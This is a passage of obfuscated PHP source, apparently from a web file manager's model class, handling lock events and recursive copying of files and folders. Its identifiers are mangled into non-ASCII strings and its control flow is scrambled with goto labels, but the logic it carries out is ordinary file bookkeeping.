$E„·ÓÀ›ŒÇ); $this->_lockParent($b˜èÙŸ©¶Ê, array($C¢Şšã¾’[529]), $E„·ÓÀ›ŒÇ); goto Dæë³óŠĞˆ; Dæë³óŠĞˆ: $this->_lockEvent($b˜èÙŸ©¶Ê, array($C¢Şšã¾’[530], $C¢Şšã¾’[531]), $E„·ÓÀ›ŒÇ); $this->_lockCheckEnd($C¢Şšã¾’[527], $b˜èÙŸ©¶Ê); goto aÚŠö´†; aÚŠö´†: } public function lockCopyEnd($fÇ¨À‹®Å¯) { $fØ‡ã‘ìëö =& $_SERVER[Ü˜]; if (!$this->allowLock()) { return; } $F«ÙÀ­áã£ = 0; $this->_lockEvent($fÇ¨À‹®Å¯, array($fØ‡ã‘ìëö[528], $fØ‡ã‘ìëö[529]), $F«ÙÀ­áã£); $this->_lockParent($fÇ¨À‹®Å¯, array($fØ‡ã‘ìëö[529]), $F«ÙÀ­áã£); $this->_lockEvent($fÇ¨À‹®Å¯, array($fØ‡ã‘ìëö[530], $fØ‡ã‘ìëö[531]), $F«ÙÀ­áã£); } public function lockWriteStart($cŞ©ª‘¦Å, $DÎéÂÅ©“´ = '') { goto fïœØ¿œ…Ë; fµÖøŒÇ¦†: $B‰ïŒ•Ê´ = 1; $this->_lockKey($A„Š»‡ï„Ì[532] . $cŞ©ª‘¦Å . $A„Š»‡ï„Ì[105] . $DÎéÂÅ©“´, $B‰ïŒ•Ê´); $this->_lockEvent($cŞ©ª‘¦Å, array($A„Š»‡ï„Ì[527], $A„Š»‡ï„Ì[529]), $B‰ïŒ•Ê´); goto fê†’ˆ¥È÷; fïœØ¿œ…Ë: $A„Š»‡ï„Ì =& $_SERVER[Ü˜]; if (!$this->allowLock()) { return; } $this->_lockCheck($A„Š»‡ï„Ì[528], $cŞ©ª‘¦Å); goto fµÖøŒÇ¦†; fê†’ˆ¥È÷: $this->_lockParent($cŞ©ª‘¦Å, array($A„Š»‡ï„Ì[527], $A„Š»‡ï„Ì[529]), $B‰ïŒ•Ê´); $this->_lockCheckEnd($A„Š»‡ï„Ì[528], $cŞ©ª‘¦Å); goto D¼±µš¾»å; D¼±µš¾»å: } public function lockWriteEnd($b¤³Ù‡ä¯, $AÖ çÍĞŒ = '') { $cÁœÜŒ«„Ì =& $_SERVER[Ü˜]; if (!$this->allowLock()) { return; } $aÉôªÑ…Ã = 0; $this->_lockKey($cÁœÜŒ«„Ì[532] . $b¤³Ù‡ä¯ . $cÁœÜŒ«„Ì[105] . $AÖ çÍĞŒ, $aÉôªÑ…Ã); $this->_lockEvent($b¤³Ù‡ä¯, array($cÁœÜŒ«„Ì[527], $cÁœÜŒ«„Ì[529]), $aÉôªÑ…Ã); $this->_lockParent($b¤³Ù‡ä¯, array($cÁœÜŒ«„Ì[527], $cÁœÜŒ«„Ì[529]), $aÉôªÑ…Ã); } public function lockMoveStart($e„¨¶Åå»±) { goto A¾‚¾Ñ°Ÿ; fÎ”˜–Ï‡: $this->_lockParent($e„¨¶Åå»±, array($e°„ÊÒ…£[527], $e°„ÊÒ…£[529]), $EÒ¿¢´ÚŒ); $this->_lockEvent($e„¨¶Åå»±, array($e°„ÊÒ…£[534], $e°„ÊÒ…£[530], $e°„ÊÒ…£[531]), $EÒ¿¢´ÚŒ); $this->_lockCheckEnd($e°„ÊÒ…£[529], $e„¨¶Åå»±); goto dê™×ò©Û; B²Ø™éŸÇğ: $EÒ¿¢´ÚŒ = 1; $this->_lockKey($e°„ÊÒ…£[533] . $e„¨¶Åå»±, $EÒ¿¢´ÚŒ); $this->_lockEvent($e„¨¶Åå»±, array($e°„ÊÒ…£[527], $e°„ÊÒ…£[528]), $EÒ¿¢´ÚŒ); goto fÎ”˜–Ï‡; A¾‚¾Ñ°Ÿ: $e°„ÊÒ…£ =& $_SERVER[Ü˜]; if (!$this->allowLock()) { return; } $this->_lockCheck($e°„ÊÒ…£[529], $e„¨¶Åå»±); goto B²Ø™éŸÇğ; dê™×ò©Û: } public function lockMoveEnd($FÚˆê‡Š¿) { goto b‹«ñ „‰„; b‹«ñ „‰„: $E‚ùÒĞ—Ù… =& $_SERVER[Ü˜]; if (!$this->allowLock()) { return; } $Cà÷Ææ—¦ = 0; goto bÕ‰¾ßîºô; f®¡‹â’«’: $this->_lockEvent($FÚˆê‡Š¿, array($E‚ùÒĞ—Ù…[534], $E‚ùÒĞ—Ù…[530], $E‚ùÒĞ—Ù…[531]), $Cà÷Ææ—¦); goto eßŒæàº°Â; bÕ‰¾ßîºô: $this->_lockKey($E‚ùÒĞ—Ù…[533] . $FÚˆê‡Š¿, $Cà÷Ææ—¦); $this->_lockEvent($FÚˆê‡Š¿, array($E‚ùÒĞ—Ù…[527], $E‚ùÒĞ—Ù…[528]), $Cà÷Ææ—¦); $this->_lockParent($FÚˆê‡Š¿, array($E‚ùÒĞ—Ù…[527], $E‚ùÒĞ—Ù…[529]), $Cà÷Ææ—¦); goto f®¡‹â’«’; eßŒæàº°Â: } private function _lockCheck($dâ¿¢ÇâÙ, $aÛ¯©øñÙ÷) { goto CØñˆ£“Ÿè; EŒâåğ÷£†: $dÜŒáõ²á£ = array_reverse($this->parentLevelArray($Aƒ¤æî¢Äë[$eÉ³‰¯¹ç[496]])); foreach ($dÜŒáõ²á£ as $FÁ¹õ«¶ÆŒ) { $d½ŞóíŞ = $dâ¿¢ÇâÙ . $eÉ³‰¯¹ç[536] . $FÁ¹õ«¶ÆŒ; if (CacheLock::lockGet($eÉ³‰¯¹ç[537] . $d½ŞóíŞ)) { $Aƒ¤æî¢Äë = $this->sourceInfo($FÁ¹õ«¶ÆŒ); CacheLock::setErrorMsg($eÉ³‰¯¹ç[170] . htmlspecialchars($Aƒ¤æî¢Äë[$eÉ³‰¯¹ç[28]]) . $eÉ³‰¯¹ç[513] . $EÙ¡ëë™¨´); $this->_lockKey($d½ŞóíŞ, 1); $this->_lockKey($d½ŞóíŞ, 0); } } goto Eß²¦Ø£Çâ; CØñˆ£“Ÿè: $eÉ³‰¯¹ç =& $_SERVER[Ü˜]; $Aƒ¤æî¢Äë = $this->sourceInfo($aÛ¯©øñÙ÷); $d½ŞóíŞ = $dâ¿¢ÇâÙ . $eÉ³‰¯¹ç[105] . $aÛ¯©øñÙ÷; goto E¦ØÄËÃÆï; C¶«¿†æã×: CacheLock::setErrorMsg($eÉ³‰¯¹ç[170] . htmlspecialchars($Aƒ¤æî¢Äë[$eÉ³‰¯¹ç[28]]) . $eÉ³‰¯¹ç[513] . $EÙ¡ëë™¨´); $this->_lockKey($d½ŞóíŞ, 1); $this->_lockKey($d½ŞóíŞ, 0); goto EŒâåğ÷£†; E¦ØÄËÃÆï: $this->_lockTimeStart[$d½ŞóíŞ] = timeFloat(); if (!is_array($Aƒ¤æî¢Äë)) { return; } $EÙ¡ëë™¨´ = LNG($eÉ³‰¯¹ç[535]); goto C¶«¿†æã×; Eß²¦Ø£Çâ: } private function _lockCheckEnd($a¤Áˆç™Å, $a‰¬‘ó£“Õ) { goto dçêˆêàïò; dçêˆêàïò: $FåÍï÷“ñø =& $_SERVER[Ü˜]; $c—Ê§ŸÅ•Ÿ = $a¤Áˆç™Å . $FåÍï÷“ñø[105] . $a‰¬‘ó£“Õ; CacheLock::setErrorMsg($FåÍï÷“ñø[384]); goto cÙÆ½™‚»‹; FåÜŒ­¤‘‡: if ($DØ¬ó®í > 0.5) { unset(self::$cacheSourceInfo[$FåÍï÷“ñø[447] . $a‰¬‘ó£“Õ]); } $AÒ™¥±–Ú = $this->sourceInfo($a‰¬‘ó£“Õ); if (!$AÒ™¥±–Ú) { show_json(LNG($FåÍï÷“ñø[115]), !1); } goto cãÃïò”Á; cÙÆ½™‚»‹: if (!isset($this->_lockTimeStart[$c—Ê§ŸÅ•Ÿ])) { return; } $DØ¬ó®í = timeFloat() - $this->_lockTimeStart[$c—Ê§ŸÅ•Ÿ]; unset($this->_lockTimeStart[$c—Ê§ŸÅ•Ÿ]); goto FåÜŒ­¤‘‡; cãÃïò”Á: } private function _lockParent($Aïğ×é…ññ, $dâó‹õÁ, $C·§Äè›Ñ) { if (!$this->autoLockSet) { return; } $fŒ˜²ÆÁö¡ = $this->sourceInfo($Aïğ×é…ññ); if (!is_array($fŒ˜²ÆÁö¡)) { return; } $FËâ­ª¢Ç = array_reverse($this->parentLevelArray($fŒ˜²ÆÁö¡[$_SERVER[Ü˜][496]])); foreach ($FËâ­ª¢Ç as $d¼¸Áƒ¬ÃŸ) { $this->_lockEvent($d¼¸Áƒ¬ÃŸ, $dâó‹õÁ, $C·§Äè›Ñ); } } private function _lockEvent($BÍ¯çœ‘¯ï, $Dê¾÷Ğ©Áà, $eĞƒÛ˜…ª) { $bë±æñÂ‡„ =& $_SERVER[Ü˜]; if (!$this->autoLockSet) { return; } foreach ($Dê¾÷Ğ©Áà as $Dê»äõÀƒÀ) { $eÃ¼ò¨ÜÑš = $Dê»äõÀƒÀ . $bë±æñÂ‡„[105] . $BÍ¯çœ‘¯ï; if ($eĞƒÛ˜…ª && CacheLock::lockGet($bë±æñÂ‡„[537] . $eÃ¼ò¨ÜÑš)) { continue; } $this->_lockKey($eÃ¼ò¨ÜÑš, $eĞƒÛ˜…ª); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($d¾÷˜ö“, $C£Ã‰Ê¬Ğš = 1) { $a„£å‹ÓÎ² = $_SERVER[Ü˜][537] . md5($d¾÷˜ö“); if ($C£Ã‰Ê¬Ğš) { if (isset(self::$_lockItemArr[$a„£å‹ÓÎ²])) { return; } self::$_lockItemArr[$a„£å‹ÓÎ²] = 1; CacheLock::lock($a„£å‹ÓÎ², $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$a„£å‹ÓÎ²])) { return; } unset(self::$_lockItemArr[$a„£å‹ÓÎ²]); CacheLock::unlock($a„£å‹ÓÎ²); } } public function isParentOf($A«áò¼Ù‘, $a›÷ÉøîÉ) { goto C¾¥ô›…ğâ; C¾¥ô›…ğâ: $c¬ÜÇ—…™ =& $_SERVER[Ü˜]; $b™ó¥’Ú™ = $this->sourceInfo($A«áò¼Ù‘); $aĞÜ•ÑÛ°Ú = $this->sourceInfo($a›÷ÉøîÉ); goto FÍÓÂïàñî; FÍÓÂïàñî: $B›–©”ƒÎë = $b™ó¥’Ú™[$c¬ÜÇ—…™[496]] . $b™ó¥’Ú™[$c¬ÜÇ—…™[404]] . $c¬ÜÇ—…™[47]; $F¥æ”³‘òç = $aĞÜ•ÑÛ°Ú[$c¬ÜÇ—…™[496]] . $aĞÜ•ÑÛ°Ú[$c¬ÜÇ—…™[404]] . $c¬ÜÇ—…™[47]; $B¯â«Ò¯”Å = strpos($F¥æ”³‘òç, $B›–©”ƒÎë) === 0; goto dÚÆšÊß™; dÚÆšÊß™: return $B¯â«Ò¯”Å; goto aãèÊİÊæÂ; aãèÊİÊæÂ: } private $targetIsDelete = 0; public function copy($cß›é“İÒğ, $A±“öáöÇ‰, $F¸ÈŸÂ†¹† = REPEAT_REPLACE, $E†äåïÖ®· = '') { goto E„“”’ôŠ×; C»å¤ù«­¶: $this->targetIsDelete = intval($DÕºøğ „¸[$Eì¯ªŠ»òÙ[432]]); $Dá¢‰ßÇ = $this->fileNameExistCache($A±“öáöÇ‰, $DÕºøğ „¸[$Eì¯ªŠ»òÙ[28]]); $C²‡ÉõøÃË = $this->_copy($cß›é“İÒğ, $A±“öáöÇ‰, $F¸ÈŸÂ†¹†, $dæÎšî‘¤Â, !0, $E†äåïÖ®·); goto BØÄÕ™†¿; dİÔ…§ª: if (!$DÕºøğ „¸ || !$C§¡â²È³¯ || $C§¡â²È³¯[$Eì¯ªŠ»òÙ[412]] != $Eì¯ªŠ»òÙ[97]) { return !1; } if ($this->isParentOf($cß›é“İÒğ, $A±“öáöÇ‰)) { return !1; } $bà„ŞÀõŸ = $E†äåïÖ®· ? $E†äåïÖ®· : $DÕºøğ „¸[$Eì¯ªŠ»òÙ[28]]; goto Aå×ÎâÕò™; f‘¿¤¶ƒğò: $this->updateModifyTime($A±“öáöÇ‰); return $C²‡ÉõøÃË; goto C—á‰´æË; BØÄÕ™†¿: $this->_childrenListClear(); $this->lockCopyEnd($cß›é“İÒğ); $this->lockWriteEnd($A±“öáöÇ‰, $bà„ŞÀõŸ); goto Cç ¿‚³‰; Cç ¿‚³‰: if ($DÕºøğ „¸[$Eì¯ªŠ»òÙ[412]] == $Eì¯ªŠ»òÙ[97] && $Dá¢‰ßÇ == $C²‡ÉõøÃË) { $this->folderSizeResetChildren($Dá¢‰ßÇ); } Model($Eì¯ªŠ»òÙ[541])->addAll($dæÎšî‘¤Â[$Eì¯ªŠ»òÙ[539]], array(), !0); if ($Dá¢‰ßÇ != $C²‡ÉõøÃË || $DÕºøğ „¸[$Eì¯ªŠ»òÙ[412]] == $Eì¯ªŠ»òÙ[97]) { Model($Eì¯ªŠ»òÙ[542])->eventCopy($C²‡ÉõøÃË); } goto eóÇÏ’ƒËø; eóÇÏ’ƒËø: $this->saveAll($dæÎšî‘¤Â[$Eì¯ªŠ»òÙ[540]]); Model($Eì¯ªŠ»òÙ[203])->linkAdd($dæÎšî‘¤Â[$Eì¯ªŠ»òÙ[538]]); $this->folderSizeReset($A±“öáöÇ‰); goto f‘¿¤¶ƒğò; E„“”’ôŠ×: $Eì¯ªŠ»òÙ =& $_SERVER[Ü˜]; $DÕºøğ „¸ = $this->sourceInfo($cß›é“İÒğ); $C§¡â²È³¯ = $this->sourceInfo($A±“öáöÇ‰); goto dİÔ…§ª; Aå×ÎâÕò™: $this->lockCopyStart($cß›é“İÒğ); $this->lockWriteStart($A±“öáöÇ‰, $bà„ŞÀõŸ); $dæÎšî‘¤Â = array($Eì¯ªŠ»òÙ[538] => array(), $Eì¯ªŠ»òÙ[539] => array(), $Eì¯ªŠ»òÙ[540] => array()); goto C»å¤ù«­¶; C—á‰´æË: } private function _copy($a­àºàÆõã, $déëÀœ¶Ä, $b«™³®‡¸§, &$F­îºƒŸ¦æ, $Aæ§Ö×øóâ, $eÄ‰öä–­Î = '') { goto eÙ”‰Ø¹º‘; a´¡§™Ä¿Û: return $eÑ“ØµŠÁ; goto cŠ¡±Ì•‘; eÙ”‰Ø¹º‘: $AŸšÍø—™Œ =& $_SERVER[Ü˜]; $DÙ¿Ç©ª¼³ = $this->sourceInfoCache($a­àºàÆõã); $DÙ”¸ßëß = $DÙ¿Ç©ª¼³[$AŸšÍø—™Œ[412]] == $AŸšÍø—™Œ[97]; goto bÖ„çÆï«Ë; bÖ„çÆï«Ë: $eãÀïŸ’‰˜ = $eÄ‰öä–­Î ? $eÄ‰öä–­Î : $DÙ¿Ç©ª¼³[$AŸšÍø—™Œ[28]]; $bôÓîÊğ = $this->fileNameExistCache($déëÀœ¶Ä, $eãÀïŸ’‰˜); if ($Aæ§Ö×øóâ) { $this->_childrenAllMake($a­àºàÆõã); if ($DÙ”¸ßëß && $bôÓîÊğ) { $this->_childrenAllMake($bôÓîÊğ); } } goto F¬ÅŸ¬; F¬ÅŸ¬: if (!$bôÓîÊğ) { return $this->_copyCreate($a­àºàÆõã, $déëÀœ¶Ä, $eãÀïŸ’‰˜, $F­îºƒŸ¦æ); } $eÑ“ØµŠÁ = $bôÓîÊğ; if ($DÙ”¸ßëß) { if ($b«™³®‡¸§ == REPEAT_RENAME_FOLDER) { $eãÀïŸ’‰˜ = $this->fileNameAutoCache($déëÀœ¶Ä, $eãÀïŸ’‰˜, $b«™³®‡¸§, $DÙ”¸ßëß); $eÑ“ØµŠÁ = $this->_copyCreate($a­àºàÆõã, $déëÀœ¶Ä, $eãÀïŸ’‰˜, $F­îºƒŸ¦æ); } else { $fì¢ãÃ‹´ğ = $this->_childrenList($a­àºàÆõã); foreach ($fì¢ãÃ‹´ğ as $cÍ–—¾Ó¹ç) { $this->_copy($cÍ–—¾Ó¹ç[$AŸšÍø—™Œ[404]], $bôÓîÊğ, $b«™³®‡¸§, $F­îºƒŸ¦æ, !1); } } } else { if ($b«™³®‡¸§ == REPEAT_RENAME || $b«™³®‡¸§ == REPEAT_RENAME_FOLDER) { $eãÀïŸ’‰˜ = $this->fileNameAutoCache($déëÀœ¶Ä, $eãÀïŸ’‰˜, $b«™³®‡¸§, $DÙ”¸ßëß); $eÑ“ØµŠÁ = $this->_copyCreate($a­àºàÆõã, $déëÀœ¶Ä, $eãÀïŸ’‰˜, $F­îºƒŸ¦æ); } else { if ($b«™³®‡¸§ == REPEAT_REPLACE) { $b§ôØ‘²˜ê = $this->sourceInfoCache($bôÓîÊğ); $D¥­µèÚ»ó = $this->fileHistory($b§ôØ‘²˜ê, $DÙ¿Ç©ª¼³[$AŸšÍø—™Œ[456]], $DÙ¿Ç©ª¼³[$AŸšÍø—™Œ[88]]); if ($D¥­µèÚ»ó) { $F­îºƒŸ¦æ[$AŸšÍø—™Œ[538]][] = $DÙ¿Ç©ª¼³[$AŸšÍø—™Œ[456]]; } } else { if ($b«™³®‡¸§ == REPEAT_SKIP) { } } } Hook::trigger($AŸšÍø—™Œ[543], array($AŸšÍø—™Œ[544], $DÙ¿Ç©ª¼³, 0)); } goto a´¡§™Ä¿Û; cŠ¡±Ì•‘: } private function _copyCreate($E„¥–¬¡—Ì, $aëË‹áæ£œ, $DŞõœ¥ÊÏ, &$B×÷Äù‰À¡) { goto f ç–ÉÑš; bõ¢«ƒ–Ä¬: $aİÇâ‘ÄæÒ[$E„¥–¬¡—Ì] = $aãªçøˆ‡; $FÕÕÅ¦Äİ = array(); $F‹…Šôññ  = array(); goto B¸ÓÙ»˜ë; f ç–ÉÑš: $bª­˜’ÍŒ½ =& $_SERVER[Ü˜]; $D´ğÔÏ›”´ = $this->sourceInfoCache($E„¥–¬¡—Ì); $eõíµå´µ = $this->sourceInfoCache($aëË‹áæ£œ); goto e÷³ùµÑƒ¤; b‡ËÌ”’Ñ‚: $this->_childrenListAll($E„¥–¬¡—Ì, $c¼—ÆÃÁ„); $dº„ŒÒ­¯Ë = count($c¼—ÆÃÁ„); if ($dº„ŒÒ­¯Ë == 0) { return $aãªçøˆ‡; } goto d”¢Ó¥Ü– ; cÕ¡¿îá×æ: $this->addAll($F¹‘ ó, array(), !1); $c§˜ğŠä† = $this->where(array($bª­˜’ÍŒ½[487] => $aãªçøˆ‡))->select(); $aİÇâ‘ÄæÒ = $this->_childrenMakeRelation($c¼—ÆÃÁ„, $c§˜ğŠä†); goto bõ¢«ƒ–Ä¬; CÇÎšò·‘: if ($D´ğÔÏ›”´[$bª­˜’ÍŒ½[412]] != $bª­˜’ÍŒ½[97]) { $B×÷Äù‰À¡[$bª­˜’ÍŒ½[538]][] = $D´ğÔÏ›”´[$bª­˜’ÍŒ½[456]]; return $aãªçøˆ‡; } $c¼—ÆÃÁ„ = array(); $F¹‘ ó = array(); goto b‡ËÌ”’Ñ‚; D˜å©–ù—¦: $this->chunkEventSet($bª­˜’ÍŒ½[552], array($bª­˜’ÍŒ½[553], $cã­¿µ£ßì, $dº„ŒÒ­¯Ë)); $this->saveAll($F‹…Šôññ ); return $aãªçøˆ‡; goto Bà˜Àï‰‰; e÷³ùµÑƒ¤: $cã­¿µ£ßì = $this->_makeItemData($D´ğÔÏ›”´, $eõíµå´µ, $DŞõœ¥ÊÏ); Hook::trigger($bª­˜’ÍŒ½[545], $cã­¿µ£ßì); Hook::trigger($bª­˜’ÍŒ½[546], array($bª­˜’ÍŒ½[547], $cã­¿µ£ßì, 0)); goto bŒÑ®Ş¹Èœ; d”¢Ó¥Ü– : $B…›º’Ä³ = $this->sourceInfo($aãªçøˆ‡); foreach ($c¼—ÆÃÁ„ as $DİÕ«ëªŸ) { $Då¤¢ÉèÄ‡ = $this->_makeItemData($DİÕ«ëªŸ, $B…›º’Ä³, $DİÕ«ëªŸ[$bª­˜’ÍŒ½[28]]); $Då¤¢ÉèÄ‡[$bª­˜’ÍŒ½[496]] = $DİÕ«ëªŸ[$bª­˜’ÍŒ½[496]]; $F¹‘ ó[] = $Då¤¢ÉèÄ‡; } $this->chunkEventSet($bª­˜’ÍŒ½[548], array($bª­˜’ÍŒ½[549], $cã­¿µ£ßì, $dº„ŒÒ­¯Ë)); goto cÕ¡¿îá×æ; B¸ÓÙ»˜ë: foreach ($c§˜ğŠä† as $DİÕ«ëªŸ) { $dêÉˆ†»Í£ = $DİÕ«ëªŸ[$bª­˜’ÍŒ½[404]]; $aëÂˆ–„‹´ = $this->_childrenMatch($aİÇâ‘ÄæÒ, $DİÕ«ëªŸ, $B…›º’Ä³); $FÕÕÅ¦Äİ[] = array($bª­˜’ÍŒ½[404], $dêÉˆ†»Í£, $bª­˜’ÍŒ½[487], $aëÂˆ–„‹´[$bª­˜’ÍŒ½[487]]); $F‹…Šôññ [] = array($bª­˜’ÍŒ½[404], $dêÉˆ†»Í£, $bª­˜’ÍŒ½[496], $aëÂˆ–„‹´[$bª­˜’ÍŒ½[496]]); $this->_copyApplyMeta($DİÕ«ëªŸ, $B×÷Äù‰À¡); if ($DİÕ«ëªŸ[$bª­˜’ÍŒ½[412]] != $bª­˜’ÍŒ½[97]) { $B×÷Äù‰À¡[$bª­˜’ÍŒ½[538]][] = $DİÕ«ëªŸ[$bª­˜’ÍŒ½[456]]; } } $this->chunkEventSet($bª­˜’ÍŒ½[550], array($bª­˜’ÍŒ½[551], $cã­¿µ£ßì, $dº„ŒÒ­¯Ë)); $this->saveAll($FÕÕÅ¦Äİ); goto D˜å©–ù—¦; bŒÑ®Ş¹Èœ: $aãªçøˆ‡ = $this->add($cã­¿µ£ßì); $D§Ş‡ºø = array($bª­˜’ÍŒ½[404] => $aãªçøˆ‡, $bª­˜’ÍŒ½[28] => $DŞõœ¥ÊÏ); $this->_copyApplyMeta($D§Ş‡ºø, $B×÷Äù‰À¡); goto CÇÎšò·‘; Bà˜Àï‰‰: } private function _childrenMakeRelation($EŒ²·”ƒä, $AÉÉ‰Èœ„å) { $c”›àõ†ë£ =& $_SERVER[Ü˜]; $cˆâí ìÈÂ = array(); $Eó¯¾æÑÆ = array(); foreach ($EŒ²·”ƒä as $döÓ‹‚ˆã¾) { $d®¬Ü²™Œ™ = $döÓ‹‚ˆã¾[$c”›àõ†ë£[28]] . $c”›àõ†ë£[8] . $döÓ‹‚ˆã¾[$c”›àõ†ë£[496]]; $cˆâí ìÈÂ[$d®¬Ü²™Œ™] = $döÓ‹‚ˆã¾[$c”›àõ†ë£[404]]; } foreach ($AÉÉ‰Èœ„å as $döÓ‹‚ˆã¾) { $d®¬Ü²™Œ™ = $döÓ‹‚ˆã¾[$c”›àõ†ë£[28]] . $c”›àõ†ë£[8] . $döÓ‹‚ˆã¾[$c”›àõ†ë£[496]]; $dªñĞÇº¹¨ = $cˆâí ìÈÂ[$d®¬Ü²™Œ™]; $Eó¯¾æÑÆ[$dªñĞÇº¹¨] = $döÓ‹‚ˆã¾[$c”›àõ†ë£[404]]; } return $Eó¯¾æÑÆ; } private function _childrenMatch($CˆËøé‚ä©, $D÷ñ÷¢‡Ûâ, $C‰òŒ ÒÊ) { goto D™êÎò’å; c¯†×İ»Üƒ: foreach ($D¿ãôÈ÷”È as $e‹¢—ÄŞó) { if (isset($CˆËøé‚ä©[$e‹¢—ÄŞó])) { $aÂâ²ŠõÅØ .= $CˆËøé‚ä©[$e‹¢—ÄŞó] . $EŠÁ’†ª ¯[554]; } } $aÂâ²ŠõÅØ = rtrim($aÂâ²ŠõÅØ, $EŠÁ’†ª ¯[47]) . $EŠÁ’†ª ¯[47]; $DÌ“£ÛŠà = $this->parentLevelArray($aÂâ²ŠõÅØ); goto fØ“×Ãƒ˜; fØ“×Ãƒ˜: $e ŒË©Ñ” = $DÌ“£ÛŠà[count($DÌ“£ÛŠà) - 1]; return array($EŠÁ’†ª ¯[487] => $e ŒË©Ñ”, $EŠÁ’†ª ¯[496] => $aÂâ²ŠõÅØ); goto EÅ›¹†Á¼Ê; D™êÎò’å: $EŠÁ’†ª ¯ =& $_SERVER[Ü˜]; $aÂâ²ŠõÅØ = $C‰òŒ ÒÊ[$EŠÁ’†ª ¯[496]]; $D¿ãôÈ÷”È = $this->parentLevelArray($D÷ñ÷¢‡Ûâ[$EŠÁ’†ª ¯[496]]); goto c¯†×İ»Üƒ; EÅ›¹†Á¼Ê: } private function _makeItemData($aßŠÄØæĞ¬, $Bµï×‡Ü‚ç, $Eè¦Ï¼ø÷µ) { $c†ª—ÁÇÜº =& $_SERVER[Ü˜]; $aèŠ¶»‰¨ = array($c†ª—ÁÇÜº[555] => $aßŠÄØæĞ¬[$c†ª—ÁÇÜº[412]], $c†ª—ÁÇÜº[422] => $Eè¦Ï¼ø÷µ, $c†ª—ÁÇÜº[556] => $aßŠÄØæĞ¬[$c†ª—ÁÇÜº[414]], $c†ª—ÁÇÜº[457] => $aßŠÄØæĞ¬[$c†ª—ÁÇÜº[456]], $c†ª—ÁÇÜº[557] => $aßŠÄØæĞ¬[$c†ª—ÁÇÜº[88]], $c†ª—ÁÇÜº[558] => $Bµï×‡Ü‚ç[$c†ª—ÁÇÜº[413]], $c†ª—ÁÇÜº[559] => $Bµï×‡Ü‚ç[$c†ª—ÁÇÜº[493]], $c†ª—ÁÇÜº[560] => USER_ID, $c†ª—ÁÇÜº[561] => USER_ID, $c†ª—ÁÇÜº[403] => $Bµï×‡Ü‚ç[$c†ª—ÁÇÜº[404]], $c†ª—ÁÇÜº[562] => $Bµï×‡Ü‚ç[$c†ª—ÁÇÜº[496]] . $Bµï×‡Ü‚ç[$c†ª—ÁÇÜº[404]] . $c†ª—ÁÇÜº[47], $c†ª—ÁÇÜº[426] => $aßŠÄØæĞ¬[$c†ª—ÁÇÜº[94]], $c†ª—ÁÇÜº[431] => 0, $c†ª—ÁÇÜº[563] => $c†ª—ÁÇÜº[33]); return $aèŠ¶»‰¨; } private function _copyApplyMeta($DâÅŞÁ–ğ, &$dæÛ¨½Úïæ) { $CìÛöÎÉİ¥ =& $_SERVER[Ü˜]; $C‘ê©ÉŒÛ = $DâÅŞÁ–ğ[$CìÛöÎÉİ¥[404]]; $F­°æåàÂİ = $DâÅŞÁ–ğ[$CìÛöÎÉİ¥[28]]; if (!isset($DâÅŞÁ–ğ[$CìÛöÎÉİ¥[564]]) || !$DâÅŞÁ–ğ[$CìÛöÎÉİ¥[564]] || $DâÅŞÁ–ğ[$CìÛöÎÉİ¥[564]] == $CìÛöÎÉİ¥[201]) { $dæÛ¨½Úïæ[$CìÛöÎÉİ¥[540]][] = array($CìÛöÎÉİ¥[404], $C‘ê©ÉŒÛ, $CìÛöÎÉİ¥[564], short_id($C‘ê©ÉŒÛ)); } if (Input::check($F­°æåàÂİ, $CìÛöÎÉİ¥[565])) { $dæÛ¨½Úïæ[$CìÛöÎÉİ¥[539]][] = array($CìÛöÎÉİ¥[404] => $C‘ê©ÉŒÛ, $CìÛöÎÉİ¥[103] => $CìÛöÎÉİ¥[453], $CìÛöÎÉİ¥[381] => str_replace($CìÛöÎÉİ¥[50], $CìÛöÎÉİ¥[33], Pinyin::encode($F­°æåàÂİ))); $dæÛ¨½Úïæ[$CìÛöÎÉİ¥[539]][] = array($CìÛöÎÉİ¥[404] => $C‘ê©ÉŒÛ, $CìÛöÎÉİ¥[103] => $CìÛöÎÉİ¥[452], $CìÛöÎÉİ¥[381] => Pinyin::encode($F­°æåàÂİ, $CìÛöÎÉİ¥[566])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($CÎªÅëÅàç) { goto fõÃ—†´³ˆ; fõÃ—†´³ˆ: $BœùÉ‰â×Â =& $_SERVER[Ü˜]; $bøõ¥‘‡íï = $this->sourceInfo($CÎªÅëÅàç); $aöá®Ö®Å¦ = $BœùÉ‰â×Â[433]; goto d“‘„Š¶; C»™™¹Ö: $CøÆ‰›Ò•ó = array_to_keyvalue($CøÆ‰›Ò•ó, $BœùÉ‰â×Â[404]); foreach ($CøÆ‰›Ò•ó as $A—‘‰ÖÓ…¶) { $bÛ¯îó·ÌÅ = $A—‘‰ÖÓ…¶[$BœùÉ‰â×Â[487]]; $CÎªÅëÅàç = $A—‘‰ÖÓ…¶[$BœùÉ‰â×Â[404]]; if (!isset($this->_childrenListCache[$CÎªÅëÅàç]) && $A—‘‰ÖÓ…¶[$BœùÉ‰â×Â[412]] == $BœùÉ‰â×Â[97]) { $this->_childrenListCache[$CÎªÅëÅàç] = array(); } if (!isset($this->_childrenListCache[$bÛ¯îó·ÌÅ])) { $this->_childrenListCache[$bÛ¯îó·ÌÅ] = array(); } $this->_childrenListCache[$bÛ¯îó·ÌÅ][$CÎªÅëÅàç] = $A—‘‰ÖÓ…¶; $this->_childrenItemCache[$CÎªÅëÅàç] = $A—‘‰ÖÓ…¶; } goto eùÏ±À‹¡ø; d“‘„Š¶: $fº‰¨ÖÃ¯ = array($BœùÉ‰â×Â[496] => array($BœùÉ‰â×Â[521], $bøõ¥‘‡íï[$BœùÉ‰â×Â[496]] . $CÎªÅëÅàç . $BœùÉ‰â×Â[522]), $BœùÉ‰â×Â[432] => $this->targetIsDelete); $CøÆ‰›Ò•ó = $this->field($aöá®Ö®Å¦)->where($fº‰¨ÖÃ¯)->select(); if (!$CøÆ‰›Ò•ó) { return; } goto C»™™¹Ö; eùÏ±À‹¡ø: } private function _childrenListAll($c¿Ãî´†¯, &$f™½§ÕÁ˜÷) { $Dœ‹›é˜Ô =& $_SERVER[Ü˜]; if (!isset($this->_childrenListCache[$c¿Ãî´†¯])) { return; } $d²ïÎìô•² = $this->_childrenListCache[$c¿Ãî´†¯]; foreach ($d²ïÎìô•² as $a¹è¦†‰æÔ => $d¹·ˆíÏ‹) { $f™½§ÕÁ˜÷[$a¹è¦†‰æÔ] = $d¹·ˆíÏ‹; if 